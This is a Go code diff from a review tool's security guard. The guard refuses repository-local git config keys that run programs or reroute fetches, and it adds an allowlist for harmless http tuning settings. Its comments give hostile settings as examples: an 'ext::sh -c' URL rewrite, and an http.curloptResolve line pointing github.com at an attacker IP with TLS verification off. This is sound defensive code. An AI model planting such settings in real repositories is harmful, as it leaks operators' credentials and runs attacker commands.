@@ -1818,6 +1818,9 @@ func (c *Collector) pathInTree(ctx context.Context, tree, p string) (bool, error
 // -c commit.gpgSign=false, but refusing preserves legitimate signed round commits
 // for a trusted operator instead of silently dropping their signatures.
 //
+// The settings that execute nothing but reroute git's network access are the same
+// loss on the fetch path, and are judged by unsafeTransportConfigKey.
+//
 // The DIFF settings are the same class on the read path. diff.external replaces
 // git's own diff engine with a program, and diff.<driver>.command/textconv do the
 // same for whatever paths a `diff=<driver>` line in .gitattributes selects --
@@ -1827,10 +1830,32 @@ func (c *Collector) pathInTree(ctx context.Context, tree, p string) (bool, error
 // the reviewer and coder CLIs run their own `git diff`/`git log -p` inside the
 // target, and no -c override can disable a driver whose name the repository
 // chooses. Refusing is the only thing that covers both.
-//
-// The TRANSPORT settings below are the same class on the fetch path this guard
-// exists to protect -- pr mode's `gh pr checkout` and Prepare's `git fetch` of the
-// base object:
+func unsafeConfigKey(key string) bool {
+	switch {
+	case filterConfigKey(key):
+		return true
+	case key == "core.sshcommand" || key == "core.askpass":
+		return true
+	case key == "diff.external":
+		return true
+	case strings.HasPrefix(key, "diff.") &&
+		(strings.HasSuffix(key, ".command") || strings.HasSuffix(key, ".textconv")):
+		return true
+	case strings.HasPrefix(key, "credential.") && strings.HasSuffix(key, ".helper"):
+		return true
+	case strings.HasPrefix(key, "gpg.") && strings.HasSuffix(key, ".program"):
+		return true
+	}
+	return unsafeTransportConfigKey(key)
+}
+
+// unsafeTransportConfigKey reports whether a repo-supplied key changes WHERE git
+// connects, WHAT it trusts there, or WHAT it sends -- on the fetch path this guard
+// exists to protect, pr mode's `gh pr checkout` and Prepare's `git fetch` of the
+// base object. Some of these run a program and some do not; the loss is the same
+// either way, because the operator's credential helper answers an auth challenge
+// from whatever host the fetch reaches and the objects that host serves become the
+// reviewed "PR".
 //
 //   - url.<base>.insteadOf / pushInsteadOf rewrite the URL git actually contacts.
 //     `[url "ext::sh -c <cmd>"] insteadOf = https://github.com/` leaves
@@ -1842,29 +1867,55 @@ func (c *Collector) pathInTree(ctx context.Context, tree, p string) (bool, error
 //   - core.gitProxy is a program git runs for git:// transport.
 //   - remote.<name>.uploadPack/receivePack/proxy are programs run for local and
 //     file transports.
+//   - the http.* section executes nothing and gets there anyway: a repo-local
+//     `http.curloptResolve = github.com:443:<attacker ip>` plus
+//     `http.sslVerify = false` keeps remote.origin.url an ordinary
+//     https://github.com URL (so gh still resolves the PR) while the fetch behind
+//     it contacts the attacker's host over an unverified connection. Git looks a
+//     credential up by URL, not by resolved address, so the operator's github.com
+//     token goes out the moment that host answers with a challenge.
 //
-// The names are dynamic (subsections), so like the filters they cannot be
-// neutralized by a -c override; refusing is the answer.
-func unsafeConfigKey(key string) bool {
+// None of it can be neutralized by a -c pin: the names above are dynamic
+// (subsections), and the http section's URL-specific forms
+// (`http.https://github.com/.sslVerify`) beat any generic pin gitenv could carry,
+// since git applies the most specific match. Refusing is the answer.
+func unsafeTransportConfigKey(key string) bool {
 	switch {
-	case filterConfigKey(key):
-		return true
-	case key == "core.sshcommand" || key == "core.gitproxy" || key == "core.askpass":
-		return true
-	case key == "diff.external":
-		return true
-	case strings.HasPrefix(key, "diff.") &&
-		(strings.HasSuffix(key, ".command") || strings.HasSuffix(key, ".textconv")):
-		return true
-	case strings.HasPrefix(key, "credential.") && strings.HasSuffix(key, ".helper"):
-		return true
-	case strings.HasPrefix(key, "gpg.") && strings.HasSuffix(key, ".program"):
+	case key == "core.gitproxy":
 		return true
 	case strings.HasPrefix(key, "url.") &&
 		(strings.HasSuffix(key, ".insteadof") || strings.HasSuffix(key, ".pushinsteadof")):
 		return true
 	case strings.HasPrefix(key, "remote.") &&
 		(strings.HasSuffix(key, ".uploadpack") || strings.HasSuffix(key, ".receivepack") || strings.HasSuffix(key, ".proxy")):
+		return true
+	case strings.HasPrefix(key, "http.") && !tuningHTTPConfigKey(key):
+		return true
+	}
+	return false
+}
+
+// tuningHTTPConfigKey reports whether an http.* setting only tunes how a transfer
+// is performed -- buffer sizes, timeouts, connection reuse, protocol version, the
+// User-Agent -- and so is none of unsafeTransportConfigKey's business. Everything
+// else in the section is refused.
+//
+// The http section is judged by allowlist, unlike every other class above, because
+// its dangerous surface is broad (redirection, TLS trust, client certificates,
+// cookie jars, unchallenged credential transmission) and still growing, while its
+// harmless surface is this short and stable list. Naming the dangerous keys instead
+// would silently trust the next one git adds; this way an unrecognized http setting
+// costs a named refusal the operator can read, not a rerouted authenticated fetch.
+func tuningHTTPConfigKey(key string) bool {
+	// The variable is the part after the optional <url> subsection. git lowercases
+	// section and variable names but preserves the subsection verbatim, and a URL
+	// subsection contains dots of its own, so the variable is the segment after the
+	// LAST dot: both `http.sslverify` and `http.https://github.com/.sslverify` yield
+	// "sslverify".
+	switch key[strings.LastIndexByte(key, '.')+1:] {
+	case "postbuffer", "lowspeedlimit", "lowspeedtime", "maxrequests", "minsessions",
+		"version", "useragent", "noepsv",
+		"keepaliveidle", "keepaliveinterval", "keepalivecount":
 		return true
 	}
 	return false
